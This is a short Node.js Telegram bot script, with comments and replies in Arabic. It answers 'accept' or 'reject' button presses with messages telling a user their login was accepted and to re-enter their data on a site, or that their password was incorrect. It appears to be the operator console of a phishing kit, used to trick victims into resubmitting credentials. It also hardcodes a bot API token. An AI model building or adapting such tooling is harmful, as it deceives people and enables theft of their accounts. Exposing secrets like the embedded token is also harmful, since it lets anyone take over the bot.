const TelegramBot = require('node-telegram-bot-api');

const token = '7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk';
const bot = new TelegramBot(token, { polling: true });

// عرض أخطاء polling
bot.on("polling_error", (error) => {
    console.error("⛔ polling_error:", error.message);
});

// عند الضغط على زر Accept أو Reject
bot.on('callback_query', async (callbackQuery) => {
    const action = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;

    console.log('📥 تم الضغط على الزر:', action);

    try {
        if (action === 'accept') {
            bot.sendMessage(chatId, '✅ تم قبول محاولة تسجيل الدخول. يرجى إعادة إدخال بياناتك في الموقع.');
        } else if (action === 'reject') {
            bot.sendMessage(chatId, '❌ كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مجددًا.');
        }
    } catch (err) {
        console.error('❌ خطأ أثناء المعالجة:', err);
        bot.sendMessage(chatId, '⚠️ حدث خطأ أثناء المعالجة، حاول مرة أخرى.');
    }

    bot.answerCallbackQuery(callbackQuery.id);
});
